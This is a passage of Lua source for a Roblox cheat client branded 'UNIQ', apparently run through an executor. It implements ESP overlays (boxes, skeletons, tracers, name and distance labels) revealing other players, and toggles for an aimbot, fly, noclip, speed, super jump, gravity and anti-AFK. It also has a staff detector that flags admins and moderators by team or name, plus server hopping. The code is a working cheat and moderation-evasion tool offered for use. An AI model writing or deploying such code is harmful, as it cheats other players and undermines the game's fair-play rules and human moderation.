	fpsLabel.Font = Enum.Font.GothamBold
	fpsLabel.TextSize = 14
	fpsLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
	fpsLabel.TextTransparency = 1 -- start invisible
	fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
	fpsLabel.ZIndex = 3
	fpsLabel.Parent = pill
	-- PING
	local pingLabel = Instance.new("TextLabel")
	pingLabel.Size = UDim2.new(1, -92, 0.5, 0)
	pingLabel.Position = UDim2.new(0, 92, 0, 16)
	pingLabel.BackgroundTransparency = 1
	pingLabel.Text = "PING: 0"
	pingLabel.Font = Enum.Font.GothamBold
	pingLabel.TextSize = 14
	pingLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
	pingLabel.TextTransparency = 1 -- start invisible
	pingLabel.TextXAlignment = Enum.TextXAlignment.Left
	pingLabel.ZIndex = 3
	pingLabel.Parent = pill
	-- fade in animation
	local fadeInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local logoFadeInfo = TweenInfo.new(1.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(pill, fadeInfo, { BackgroundTransparency = 0 }):Play()
	TweenService:Create(fpsLabel, fadeInfo, { TextTransparency = 0 }):Play()
	TweenService:Create(pingLabel, fadeInfo, { TextTransparency = 0 }):Play()
	task.delay(0.3,function() TweenService:Create(logo, logoFadeInfo, { ImageTransparency = 0 }):Play() end)
	local pingItem
	pcall(function() local net=game:GetService("Stats").Network local ss=net and(net.ServerStatsItem or net:FindFirstChild("ServerStatsItem")) pingItem=ss and(ss:FindFirstChild("Data Ping") or ss:FindFirstChild("Ping") or ss.Ping or ss["Data Ping"]) end)
	local fpsNum = Instance.new("NumberValue")
	fpsNum.Value = 60
	fpsNum.Parent = watermarkGui
	fpsNum:GetPropertyChangedSignal("Value"):Connect(function()
		fpsLabel.Text = "FPS: " .. tostring(math.floor(fpsNum.Value + 0.5))
	end)
	local frames = 0
	local last = tick()
		watermarkConn = RunService.RenderStepped:Connect(function()
			frames += 1
			local now = tick()
			if now - last >= 0.25 then
				local real = math.floor(frames / (now - last))
				frames = 0
				last = now
				if pingItem then pcall(function() pingLabel.Text = "PING: " .. tostring(math.floor(pingItem:GetValue())) end) end
				if fpsTween then fpsTween:Cancel() end
			fpsTween = TweenService:Create(
				fpsNum,
				TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{ Value = real }
			)
			fpsTween:Play()
		end
	end)
end
local knownStaff={} local function isStaff(p) if not p or p==player then return false end if knownStaff[p.UserId] then return true end if p.Team then local t=p.Team.Name:lower() if t:find("staff") or t:find("admin") or t:find("mod") then return true end end local ln=p.Name:lower() local ld=(p.DisplayName or ""):lower() return ln:find("admin") or ln:find("mod") or ln:find("staff") or ld:find("admin") or ld:find("mod") or ld:find("staff") end
local function getSelStaff() local l={} for _,p in ipairs(Players:GetPlayers()) do if p~=player and knownStaff[p.UserId] then table.insert(l,state.playerListTagStyle=="Display Tags" and p.DisplayName or p.Name) end end table.sort(l) return l end
staffA=Players.PlayerAdded:Connect(function(p) task.wait(1) if isStaff(p) then knownStaff[p.UserId]=p.Name end end) staffR=Players.PlayerRemoving:Connect(function(p) knownStaff[p.UserId]=nil end)
for _,p in ipairs(Players:GetPlayers()) do if isStaff(p) then knownStaff[p.UserId]=p.Name end end
local function serverHop() local body=httpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100") if not body then warn("[UNIQ] HTTP failed") return end local ok,data=pcall(function() return HttpService:JSONDecode(body) end) if not ok or not data or not data.data then warn("[UNIQ] Bad list") return end local c={} for _,s in ipairs(data.data) do if s.id and s.id~=game.JobId and s.playing and s.maxPlayers and s.playing<s.maxPlayers then table.insert(c,s.id) end end if #c==0 then warn("[UNIQ] No servers") notify("ONLINE","No open servers found") return end notify("ONLINE","Hoping to another server") TeleportService:TeleportToPlaceInstance(game.PlaceId,c[math.random(1,#c)],player) end
local function rejoin() notify("ONLINE","Rejoining the server") TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,player) end
-- ESP
local OvE,ISelf,IDead=false,false,false local BoxE,SkelE,TrE=false,false,false
local DistE,NameE,DisplayTagsE,FillE,CornE=false,false,false,false,false
local BCol=Color3.fromRGB(175,175,175) local SCol=Color3.fromRGB(255,255,255) local TCol=Color3.fromRGB(255,255,255)
local TxtFont=Enum.Font.GothamBold local BBW,BBH=4,6.5
local SKT=1 local BoxThick=1 local TracerThick=1 local FillOpacity=40 local JO=0
local Boxes,Skels,Trs,DLabels,NLabels,CConns={},{},{},{},{},{}
local FontOpts={"SourceSans","SourceSansBold","SourceSansSemibold","Gotham","GothamBold","GothamSemibold","Arial","ArialBold","Fantasy","Code","SciFi","Arcade","Cartoon"}
R15S={{"Head","UpperTorso"},{"UpperTorso","LowerTorso"},{"UpperTorso","LeftUpperArm"},{"LeftUpperArm","LeftLowerArm"},{"LeftLowerArm","LeftHand"},{"UpperTorso","RightUpperArm"},{"RightUpperArm","RightLowerArm"},{"RightLowerArm","RightHand"},{"LowerTorso","LeftUpperLeg"},{"LeftUpperLeg","LeftLowerLeg"},{"LeftLowerLeg","LeftFoot"},{"LowerTorso","RightUpperLeg"},{"RightUpperLeg","RightLowerLeg"},{"RightLowerLeg","RightFoot"}}
R6S={{"Head","Torso"},{"Torso","Left Arm"},{"Torso","Right Arm"},{"Left Arm","Left Arm Ext"},{"Right Arm","Right Arm Ext"},{"Torso","Left Leg"},{"Torso","Right Leg"},{"Left Leg","Left Leg Ext"},{"Right Leg","Right Leg Ext"}}
local function gR(c) return c and c:FindFirstChild("HumanoidRootPart") end local function gH(c) return c and c:FindFirstChildOfClass("Humanoid") end local function alive(c) local h=gH(c) return h and h.Health>0 end
local function gC(c) if not c then return R6S end if c:FindFirstChild("UpperTorso") then return R15S end return R6S end
local function shouldShow(p) if not OvE then return false end if not p or(ISelf and p==player) then return false end local c=p.Character if not c then return false end local r=gR(c) if not r then return false end if IDead and not alive(c) then return false end if state.ignoreFriend and (state.friends[p.Name] or state.friends[p.DisplayName] or state.friends[tostring(p.UserId)]) then return false end if(Camera.CFrame.Position-r.Position).Magnitude*0.28>state.visualMaxDistance then return false end return true end
local function rmBox(p) if Boxes[p] then Boxes[p]:Destroy() Boxes[p]=nil end end local function rmSkel(p) if Skels[p] then for _,l in pairs(Skels[p].lines) do l:Remove() end Skels[p]=nil end end local function rmTr(p) if Trs[p] then Trs[p]:Remove() Trs[p]=nil end end local function rmDist(p) if DLabels[p] then local g=DLabels[p].Parent DLabels[p]=nil if g then g:Destroy() end end end local function rmNm(p) if NLabels[p] then local g=NLabels[p].Parent NLabels[p]=nil if g then g:Destroy() end end end local function rmAll(p) rmBox(p) rmSkel(p) rmTr(p) rmDist(p) rmNm(p) end local function clearVis() for _,p in ipairs(Players:GetPlayers()) do rmAll(p) end end
local CN={{"HTL",true,0,0},{"VTL",false,0,0},{"HTR",true,1,0},{"VTR",false,1,0},{"HBL",true,0,1},{"VBL",false,0,1},{"HBR",true,1,1},{"VBR",false,1,1}}
local function cornerSize(h) if h then return UDim2.new(0.34,0,0,BoxThick) else return UDim2.new(0,BoxThick,0.14,0) end end
local function mkBox(p) if not BoxE then return end if not shouldShow(p) then rmBox(p) return end local r=gR(p.Character) if not r then return end rmBox(p) local b=Instance.new("BillboardGui") b.Adornee=r b.AlwaysOnTop=true b.LightInfluence=0 b.Size=UDim2.new(BBW,0,BBH,0) b.StudsOffsetWorldSpace=Vector3.new(0,-0.3,0) b.Parent=p.Character local fr=Instance.new("Frame") fr.Size=UDim2.new(1,0,1,0) fr.BorderSizePixel=0 fr.BackgroundTransparency=FillE and(1-FillOpacity/100) or 1 fr.BackgroundColor3=Color3.fromRGB(0,0,0) fr.Parent=b local s=Instance.new("UIStroke") s.Thickness=BoxThick s.Color=BCol s.Transparency=CornE and 1 or 0 s.Parent=fr for _,c in ipairs(CN) do local f=Instance.new("Frame") f.Name=c[1] f.Size=cornerSize(c[2]) f.Position=UDim2.new(c[3],0,c[4],0) f.AnchorPoint=Vector2.new(c[3],c[4]) f.BackgroundColor3=BCol f.BorderSizePixel=0 f.Visible=CornE f.Parent=fr end Boxes[p]=b end
local function mkSkel(p) if not SkelE then return end if not shouldShow(p) then rmSkel(p) return end local c=p.Character if not c then return end local cn=gC(c) pcall(function() rmSkel(p) Skels[p]={lines={},sm={},n=#cn} for _=1,#cn do local l=Drawing.new("Line") l.Thickness=SKT l.Color=SCol l.Visible=false table.insert(Skels[p].lines,l) end end) end
local function mkTr(p) if not TrE then return end if not shouldShow(p) then rmTr(p) return end if Trs[p] then return end pcall(function() local l=Drawing.new("Line") l.Thickness=TracerThick l.Color=TCol l.Visible=false Trs[p]=l end) end
local function mkLbl(p,store,cfg) local r=gR(p.Character) if not r or store[p] then return end local g=Instance.new("BillboardGui") g.Adornee=r g.Size=cfg.size g.AlwaysOnTop=true g.StudsOffsetWorldSpace=cfg.off g.Parent=p.Character local lb=Instance.new("TextLabel") lb.Size=UDim2.new(1,0,1,0) lb.BackgroundTransparency=1 lb.TextColor3=Color3.new(1,1,1) lb.TextStrokeTransparency=0 lb.TextSize=14 lb.Font=TxtFont lb.Text=cfg.text or "" lb.Parent=g store[p]=lb end
local function refreshPlayerVisuals(p) if not shouldShow(p) then rmAll(p) return end mkBox(p) mkSkel(p) mkTr(p) if DistE then mkLbl(p,DLabels,{size=UDim2.fromOffset(120,20),off=Vector3.new(0,-4.5,0)}) end if NameE or DisplayTagsE then local txt=DisplayTagsE and p.DisplayName or p.Name mkLbl(p,NLabels,{size=UDim2.new(0, 140, 0, 20),off=Vector3.new(0,4.3,0),text=txt}) end end
local refresh=refreshPlayerVisuals
local function refreshAll() if not OvE then clearVis() return end for _,p in ipairs(Players:GetPlayers()) do refreshPlayerVisuals(p) end end
local function updateFill() for _,p in ipairs(Players:GetPlayers()) do local b=Boxes[p] if b then local fr=b:FindFirstChild("Frame") if fr then fr.BackgroundTransparency=FillE and(1-FillOpacity/100) or 1 local s=fr:FindFirstChildOfClass("UIStroke") if s then s.Color=BCol s.Thickness=BoxThick s.Transparency=CornE and 1 or 0 end for _,ch in ipairs(fr:GetChildren()) do if ch:IsA("Frame") then ch.BackgroundColor3=BCol ch.Visible=CornE ch.Size=cornerSize(ch.Name:sub(1,1)=="H") end end end end end end
-- ============ AUTO REATTACH (ESP respawn) ============
local function setupPlayer(plr)
	if CConns[plr] then CConns[plr]:Disconnect() CConns[plr]=nil end
	if plr.Character then refreshPlayerVisuals(plr) end
	CConns[plr]=plr.CharacterAdded:Connect(function()
		if _G.UniqGen~=GEN then return end
        task.wait(0.5)
        if not state.autoReattach then return end
        rmAll(plr)
        refreshPlayerVisuals(plr)
    end)
end
visA=Players.PlayerAdded:Connect(function(plr) task.wait(0.5) setupPlayer(plr) end)
visR=Players.PlayerRemoving:Connect(function(plr) rmAll(plr) if CConns[plr] then CConns[plr]:Disconnect() CConns[plr]=nil end end)
for _,plr in ipairs(Players:GetPlayers()) do setupPlayer(plr) end
-- also reattach own visuals after respawn
player.CharacterRemoving:Connect(function() _G.UniqRespawn=tick() end)
charConn=player.CharacterAdded:Connect(function()
	_G.UniqRespawn=tick()
	if _G.UniqGen~=GEN then return end
	task.wait(0.5)
	if not state.autoReattach then return end
	cacheCol() applyWalkSpeed() applyJump()
	if state.noRagdoll then applyNoRagdoll(true) end
	flying=false resetControls() setNoClip(state.noclip)
	if state.flyEnabled then setFly(true) end
end)
if player.Character then cacheCol() setNoClip(state.noclip) if state.noRagdoll then applyNoRagdoll(true) end end
renderConn=RunService.RenderStepped:Connect(function()
	if _G.UniqGen~=GEN then return end
	if not OvE then return end local cp=Camera.CFrame.Position local vp=Camera.ViewportSize
	local camSt=state.camSt or {} state.camSt=camSt
	local camRV=Camera:WorldToViewportPoint(Camera.CFrame.Position+Camera.CFrame.LookVector*50) local cdx=0 local cdy=0 if camSt.X then cdx=camRV.X-camSt.X end if camSt.Y then cdy=camRV.Y-camSt.Y end camSt.X,camSt.Y=camRV.X,camRV.Y
	local nm=state.namePos or 1 local ds=state.distPos or 2 local tr=state.tracerPos or 2
	local nameOffs={{Vector3.new(0,5.0,0)},{Vector3.new(0,-2.6,0.4)},{Vector3.new(-4.1,0.9,0)},{Vector3.new(4.1,0.9,0)}}
	local distOffs={{Vector3.new(0,3.9,0)},{Vector3.new(0,-4.6,0.4)},{Vector3.new(-4.1,0,0.2)},{Vector3.new(4.1,0,0.2)}}
	local tFroms={{Vector2.new(vp.X/2,1)},{Vector2.new(vp.X/2,vp.Y-1)},{Vector2.new(1,vp.Y/2)},{Vector2.new(vp.X-1,vp.Y/2)}}
	local nOff=(nameOffs[nm] or nameOffs[1])[1] local dOff=(distOffs[ds] or distOffs[2])[1] 	local tFrom=(tFroms[tr] or tFroms[1])[1]
	for _,p in ipairs(Players:GetPlayers()) do
		pcall(function()
		local c=p.Character if not shouldShow(p) then rmAll(p) return end
		local isTarget=p==state.aimTarget
		local root=c and gR(c) local studs=0 if root then studs=(cp-root.Position).Magnitude end local meters=studs*0.28
		local hw=4.2 if root then local ok,sz=pcall(function() return c:GetExtentsSize() end) local rs=root.Size if ok then hw=math.max(math.max(sz.X,sz.Z),math.max(rs.X,rs.Z))/2+1.5 else hw=math.max(math.max(rs.X,rs.Z),2.4)/2+1.5 end end
		if SkelE then local cn=gC(c) if not Skels[p] or Skels[p].n~=#cn then mkSkel(p) end local d=Skels[p] if d then for i,pair in ipairs(cn) do local a=c:FindFirstChild(pair[1]) local l=d.lines[i] if a and l then local posA=a.Position local posB if cn==R6S and pair[2]:sub(-4)==" Ext" then posB=a.CFrame*Vector3.new(0,-a.Size.Y/2-0.05,0) else local b=c:FindFirstChild(pair[2]) if b then posB=b.Position end end if posB then local p1,v1=Camera:WorldToViewportPoint(posA) local p2,v2=Camera:WorldToViewportPoint(posB) if v1 and v2 then local x=Vector2.new(math.clamp(p1.X,3,vp.X-3),math.clamp(p1.Y,3,vp.Y-3)) local y=Vector2.new(math.clamp(p2.X,3,vp.X-3),math.clamp(p2.Y,3,vp.Y-3)) local sm=d.sm[i] if not sm then sm={} d.sm[i]=sm sm[1],sm[2],sm[3],sm[4]=x.X,x.Y,y.X,y.Y else local ex1=sm[1]+cdx local ey1=sm[2]+cdy local ex2=sm[3]+cdx local ey2=sm[4]+cdy local r1=x.X-ex1 if math.abs(r1)>4 then sm[1]=ex1+r1*math.clamp(math.abs(r1)*0.05,0.3,0.85) else sm[1]=ex1 end local r2=x.Y-ey1 if math.abs(r2)>4 then sm[2]=ey1+r2*math.clamp(math.abs(r2)*0.05,0.3,0.85) else sm[2]=ey1 end local r3=y.X-ex2 if math.abs(r3)>4 then sm[3]=ex2+r3*math.clamp(math.abs(r3)*0.05,0.3,0.85) else sm[3]=ex2 end local r4=y.Y-ey2 if math.abs(r4)>4 then sm[4]=ey2+r4*math.clamp(math.abs(r4)*0.05,0.3,0.85) else sm[4]=ey2 end end l.Visible=true l.Color=SCol l.Thickness=SKT l.From=Vector2.new(sm[1],sm[2]) l.To=Vector2.new(sm[3],sm[4]) else l.Visible=false end else l.Visible=false end elseif l then l.Visible=false end end end else rmSkel(p) end
		if TrE then if not Trs[p] then mkTr(p) end local l=Trs[p] if l then pcall(function() local pos,on=Camera:WorldToViewportPoint(root and root.Position or Vector3.zero) if on and root then l.Color=TCol l.Thickness=TracerThick l.From=tFrom l.To=Vector2.new(math.clamp(pos.X,3,vp.X-3),math.clamp(pos.Y,3,vp.Y-3)) l.Visible=true else l.Visible=false end end) elseif l then l.Visible=false end else rmTr(p) end
		if DistE then if not DLabels[p] then mkLbl(p,DLabels,{size=UDim2.fromOffset(120,20),off=dOff}) end local lb=DLabels[p] if lb and root then local g=lb.Parent if g then local sc=math.clamp(18-studs/20,10,18)/18 local off=(ds==3 or ds==4) and Camera.CFrame.RightVector*(ds==3 and -hw or hw)+Vector3.new(0,dOff.Y,0) or Vector3.new(dOff.X,dOff.Y,0) local ok,wo=pcall(function() return root.CFrame:VectorToObjectSpace(off) end) g.Enabled=true g.StudsOffsetWorldSpace=ok and wo or off g.Size=UDim2.fromOffset(120*sc,20*sc) end lb.Text=math.floor(meters).."m" lb.TextSize=math.clamp(18-studs/20,10,18) end else rmDist(p) end
		if NameE or DisplayTagsE then local tagText=DisplayTagsE and p.DisplayName or p.Name if not NLabels[p] then mkLbl(p,NLabels,{size=UDim2.new(0, 140, 0, 20),off=nOff,text=tagText}) end local lb=NLabels[p] if lb and root then local g=lb.Parent if g then local sc=math.clamp(18-studs/20,10,13)/13 local off=(nm==3 or nm==4) and Camera.CFrame.RightVector*(nm==3 and -hw or hw)+Vector3.new(0,nOff.Y,0) or Vector3.new(nOff.X,nOff.Y,0) local ok,wo=pcall(function() return root.CFrame:VectorToObjectSpace(off) end) g.Enabled=true g.StudsOffsetWorldSpace=ok and wo or off g.Size=UDim2.fromOffset(140*sc,20*sc) end local isFr=state.friends[p.Name] or state.friends[p.DisplayName] or state.friends[tostring(p.UserId)] lb.TextColor3=isFr and T.Accent or Color3.new(1,1,1) lb.TextSize=math.clamp(18-studs/20,10,13) lb.Text=tagText end else rmNm(p) end
		if BoxE then if not Boxes[p] then mkBox(p) end local box=Boxes[p] if box and root then box.Size=UDim2.new(BBW,0,BBH,0) local fr=box:FindFirstChild("Frame") if fr then local s=fr:FindFirstChildOfClass("UIStroke") if s then s.Color=isTarget and Color3.fromRGB(255,55,55) or BCol s.Thickness=BoxThick s.Transparency=CornE and 1 or 0 end for _,ch in ipairs(fr:GetChildren()) do if ch:IsA("Frame") then ch.BackgroundColor3=isTarget and Color3.fromRGB(255,55,55) or BCol ch.Size=cornerSize(ch.Name:sub(1,1)=="H") end end end end else rmBox(p) end
		end)
	end
end)
local function setVT(on,sf,rm) sf(on) if not on then for _,p in ipairs(Players:GetPlayers()) do rm(p) end else refreshAll() end end
-- HANDLERS
local TH={
	["Toggle"]=function(on,sec) if sec=="Speed" then state.walkSpeedEnabled=on applyWalkSpeed() elseif sec=="Fly" then setFly(on) elseif sec=="Super Jump" then state.jumpEnabled=on applyJump() end end,
	["No Jump Cooldown"]=function(e) state.noJumpCooldown=e end,
	["Infinite Jump"]=function(e) state.infiniteJump=e end,
	["Auto Jump"]=function(e) state.autoJump=e end,
	["No Ragdoll"]=function(e) state.noRagdoll=e applyNoRagdoll(e) end,
	["Gravity Changer"]=function(e) state.gravityChanger=e workspace.Gravity=e and state.gravityValue or 196.2 end,
	["Anti-AFK"]=function(e) state.antiAFK=e if e then if not antiAFKConn then antiAFKConn=player.Idled:Connect(function() local vu=game:GetService("VirtualUser") vu:CaptureController() vu:ClickButton2(Vector2.new(0,0)) end) end else if antiAFKConn then antiAFKConn:Disconnect() antiAFKConn=nil end end end,
	["Auto Reattach"]=function(e) state.autoReattach=e end,
	["NoClip"]=setNoClip,
	["Enabled"]=function(e) OvE=e refreshAll() end,
	["Boxes"]=function(e) setVT(e,function(v) BoxE=v end,rmBox) end,
	["Skeleton"]=function(e) setVT(e,function(v) SkelE=v end,rmSkel) end,
	["Tracers"]=function(e) setVT(e,function(v) TrE=v end,rmTr) end,
	["Distance"]=function(e) setVT(e,function(v) DistE=v end,rmDist) end,
	["Nametags"]=function(e) NameE=e if e then DisplayTagsE=false end for _,p in ipairs(Players:GetPlayers()) do rmNm(p) end refreshAll() end,
	["Display Tags"]=function(e) DisplayTagsE=e if e then NameE=false end for _,p in ipairs(Players:GetPlayers()) do rmNm(p) end refreshAll() end,
	["Ignore Dead"]=function(e) IDead=e refreshAll() end,
	["Ignore Self"]=function(e) ISelf=e refreshAll() end,
	["Ignore Friend"]=function(e) state.ignoreFriend=e refreshAll() end,
	["Filled Boxes"]=function(e) FillE=e updateFill() end,
	["Corner Boxes"]=function(e) CornE=e updateFill() end,
	["Aimbot"]=function(e) state.aimbotEnabled=e end,
	["Visible Only"]=function(e) state.aimbotVisibleOnly=e end,
	["Show FOV"]=function(e) state.showFov=e end,
	["Aim Ignore Dead"]=function(e) state.aimbotIgnoreDead=e end,
}
local SH={
	["Walk Speed"]=function(v) state.walkSpeedValue=tonumber(string.format("%.1f",v)) applyWalkSpeed() end,
	["Fly Speed"]=function(v) state.flySpeed=v end,
	["Jump Height"]=function(v) state.jumpHeight=v applyJump() end,
	["Gravity"]=function(v) state.gravityValue=v if state.gravityChanger then workspace.Gravity=v end end,
	["Max Distance"]=function(v) state.visualMaxDistance=v refreshAll() end,
	["Fill Opacity"]=function(v) FillOpacity=v updateFill() end,
	["Box Thickness"]=function(v) BoxThick=v updateFill() end,
	["Horizontal Box Size"]=function(v) BBW=v refreshAll() end,
	["Vertical Box Size"]=function(v) BBH=v refreshAll() end,
	["Tracer Thickness"]=function(v) TracerThick=v end,
	["Skeleton Thickness"]=function(v) SKT=v end,
	["FOV Size"]=function(v) state.aimbotFov=v end,
	["Horizontal Smoothing"]=function(v) state.aimbotSmoothX=v end,
	["Vertical Smoothing"]=function(v) state.aimbotSmoothY=v end,
	["Aim Min Distance"]=function(v) state.aimMinDist=v end,
	["Aim Max Distance"]=function(v) state.aimMaxDist=v end
}
local DS={["Select Player"]=getSelPlayers,["Select Staff"]=getSelStaff,["Text Style"]=function() return FontOpts end}
local DH={
	["Select Player"]=function(v) state.selectedPlayer=v end,
	["Select Staff"]=function(v) state.selectedStaff=v end,
	["Text Style"]=function(v) if Enum.Font[v] then TxtFont=Enum.Font[v] for _,l in pairs(DLabels) do l.Font=TxtFont end for _,l in pairs(NLabels) do l.Font=TxtFont end end end,
	["Target Part"]=function(v) state.aimbotTargetPart=v end,
	["Activation Mode"]=function(v) state.aimbotActivation=v state.aimbotToggled=false end
}
local function shutdown()
	setWatermark(false) setKeybindHud(false) setFriendHud(false) state.walkSpeedEnabled=false state.flyEnabled=false state.jumpEnabled=false state.noJumpCooldown=false state.infiniteJump=false state.autoJump=false state.noRagdoll=false state.gravityChanger=false state.antiAFK=false state.noclip=false OvE=false BoxE=false SkelE=false TrE=false DistE=false NameE=false DisplayTagsE=false FillE=false CornE=false state.aimbotEnabled=false state.aimbotToggled = false state.aimbotKey = nil state.aimbotActivation = "Hold"
	if fovDrawing then pcall(function() fovDrawing.Visible=false; fovDrawing:Remove() end) end
	stopSpec()
    if aimToggleConn then aimToggleConn:Disconnect() aimToggleConn=nil end
    setTouchFling(false)
    setFly(false)
    flying = false
    resetControls()
    applyNoRagdoll(false)
    workspace.Gravity = 196.2
    state.walkSpeedEnabled = false
    applyWalkSpeed()
	if antiAFKConn then antiAFKConn:Disconnect() antiAFKConn=nil end
	if aimbotConn then aimbotConn:Disconnect() aimbotConn=nil end
	for _,c in ipairs({flyConn,walkConn,noclipConn,renderConn,charConn,flyB,flyE,jumpConn,autoJumpConn,staffA,staffR,visA,visR}) do if c then pcall(function() c:Disconnect() end) end end
	local hum=player.Character and player.Character:FindFirstChildOfClass("Humanoid") if hum then hum.PlatformStand=false hum.Sit=false hum.AutoRotate=true hum:ChangeState(Enum.HumanoidStateType.GettingUp) task.wait() hum:ChangeState(Enum.HumanoidStateType.Running) end
	local hrp=player.Character and player.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.AssemblyLinearVelocity=Vector3.zero hrp.AssemblyAngularVelocity=Vector3.zero end
	updateNC() applyJump() clearVis()
	for p,c in pairs(CConns) do if c then c:Disconnect() end CConns[p]=nil end _G.UniqGen=(_G.UniqGen or 0)+1
	-- Ensure active ScreenGuis are completely destroyed on shutdown/unload
	local oldGui = CoreGui:FindFirstChild("UNIQ")
	if oldGui then oldGui:Destroy() end
	local oldPrevGui = CoreGui:FindFirstChild("UniqPreview")
	if oldPrevGui then oldPrevGui:Destroy() end
end
_G.UniqShutdown=shutdown
-- UI THEME
local Fn,FM,FB=Enum.Font.Gotham,Enum.Font.GothamMedium,Enum.Font.GothamBold
local function nn(c,p) local o=Instance.new(c) for a,b in pairs(p or {}) do o[a]=b end return o end
local function corner(p,r) nn("UICorner",{CornerRadius=UDim.new(0,p:IsA("TextButton") and 0 or r or 4),Parent=p}) end
local function stroke(p,c) return nn("UIStroke",{Color=c or T.Stroke,Thickness=1,ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Parent=p}) end
local function list(p,g) return nn("UIListLayout",{Padding=UDim.new(0,g or 4),SortOrder=Enum.SortOrder.LayoutOrder,Parent=p}) end
local function tw(o,t,g) TweenService:Create(o,TweenInfo.new(t,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),g):Play() end
local function setIcon(img,id) img.Image="rbxassetid://"..id task.delay(2,function() if img and img.Parent and not img.IsLoaded then img.Image="rbxthumb://type=Asset&id="..id.."&w=150&h=150" end end) end
-- NOTIFICATIONS (bottom right toasts)
local NotifBox
local function notify(sec,msg)
	if not NotifBox then
		local g=nn("ScreenGui",{Name="UniqNotifs",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Global,Parent=CoreGui})
		NotifBox=nn("Frame",{Size=UDim2.new(0,330,0,0),Position=UDim2.new(1,-14,1,-14),AnchorPoint=Vector2.new(1,1),BackgroundTransparency=1,Parent=g})
		list(NotifBox,8).VerticalAlignment=Enum.VerticalAlignment.Bottom
	end
	if #NotifBox:GetChildren()>5 then local oldest=NotifBox:FindFirstChild("N") if oldest then tw(oldest,0.15,{BackgroundTransparency=1}) task.delay(0.16,function() if oldest.Parent then oldest:Destroy() end end) end end
	local h=42+math.max(1,math.ceil(#msg/38))*13
	local n=nn("Frame",{Name="N",Size=UDim2.new(0,330,0,h),BackgroundColor3=Color3.fromRGB(22,22,25),BackgroundTransparency=1,BorderSizePixel=0,Parent=NotifBox}) corner(n,7) table.insert(state.accents,{stroke(n,T.Accent),"Color"})
	local secL=nn("TextLabel",{Text=sec,Font=FB,TextSize=12,TextColor3=T.Accent,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,Position=UDim2.new(0,12,0,8),Size=UDim2.new(1,-24,0,14),Parent=n}) table.insert(state.accents,{secL,"TextColor3"})
	nn("TextLabel",{Text=msg,Font=Fn,TextSize=11,TextColor3=Color3.new(1,1,1),TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,Position=UDim2.new(0,12,0,26),Size=UDim2.new(1,-24,0,h-34),Parent=n})
	tw(n,0.22,{BackgroundTransparency=0})
	task.delay(3.2,function() if n.Parent then tw(n,0.3,{BackgroundTransparency=1}) task.delay(0.32,function() if n.Parent then n:Destroy() end end) end end)
end
local oldGui=CoreGui:FindFirstChild("UNIQ") if oldGui then oldGui:Destroy() end
local Screen=nn("ScreenGui",{Name="UNIQ",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Global,DisplayOrder=1000000,Parent=CoreGui})
local FULL=UDim2.new(0,800,0,537)
local Win=nn("Frame",{Size=UDim2.new(0,800,0,0),Position=UDim2.new(0.5,-400,0.5,0),BackgroundColor3=T.Window,BorderSizePixel=0,ClipsDescendants=true,Visible=false,Parent=Screen})
local blockWin=nn("Frame",{Name="Blocker",BackgroundTransparency=1,BorderSizePixel=0,Active=true,ZIndex=0,Parent=Screen}) blockWin.Size=Win.Size blockWin.Position=Win.Position
Win:GetPropertyChangedSignal("Size"):Connect(function() blockWin.Size=Win.Size end)
Win:GetPropertyChangedSignal("Position"):Connect(function() blockWin.Position=Win.Position end)
Win:GetPropertyChangedSignal("Visible"):Connect(function() blockWin.Visible=Win.Visible end)
corner(Win,6) stroke(Win,Color3.fromRGB(32,32,32))
local Rail=nn("Frame",{Size=UDim2.new(0,67,1,0),BackgroundColor3=Color3.fromRGB(15,16,17),BorderSizePixel=0,Parent=Win}) corner(Rail,6)
local Logo=nn("ImageLabel",{Size=UDim2.new(0,64,0,64),Position=UDim2.new(0.5,-34,0,2),BackgroundTransparency=1,ImageColor3=Color3.new(1,1,1),ScaleType=Enum.ScaleType.Fit,ZIndex=2,Parent=Rail}) setIcon(Logo,"92057593184883") nn("UICorner",{CornerRadius=UDim.new(0,8),Parent=Logo})
local RailBox=nn("Frame",{Size=UDim2.new(1,0,1,-100),Position=UDim2.new(0,0,0,78),BackgroundTransparency=1,Parent=Rail}) local rl=list(RailBox,15) rl.HorizontalAlignment=Enum.HorizontalAlignment.Center
local Header=nn("Frame",{Size=UDim2.new(1,-67,0,60),Position=UDim2.new(0,67,0,0),BackgroundTransparency=1,Parent=Win}) local VSep=nn("Frame",{Size=UDim2.new(0,1,1,0),Position=UDim2.new(0,67,0,0),BackgroundColor3=Color3.fromRGB(35,37,39),BorderSizePixel=0,Parent=Win}) nn("Frame",{Size=UDim2.new(1,-67,0,1),Position=UDim2.new(0,67,0,60),BackgroundColor3=Color3.fromRGB(35,37,39),BorderSizePixel=0,Parent=Win})
local Crumb=nn("TextLabel",{Size=UDim2.new(0.7,0,1,0),Position=UDim2.new(0,22,0,0),BackgroundTransparency=1,RichText=true,Font=FM,TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,TextColor3=T.Text,Parent=Header})
local function setCrumb(t) local c=T.Accent local hx=string.format("#%02X%02X%02X",math.floor(c.R*255+0.5),math.floor(c.G*255+0.5),math.floor(c.B*255+0.5)) Crumb.Text='<font color="#EBEBEB">UNIQ</font>   <font color="#5A5A5A">&gt;</font>   <font color="'..hx..'">'..t..'</font>' end
local MinBtn=nn("ImageButton",{Size=UDim2.new(0,19,0,17),Position=UDim2.new(1,-38,0.5,-10),BackgroundTransparency=1,ImageColor3=T.Muted,ScaleType=Enum.ScaleType.Fit,AutoButtonColor=false,Parent=Header}) setIcon(MinBtn,"83381966246889")
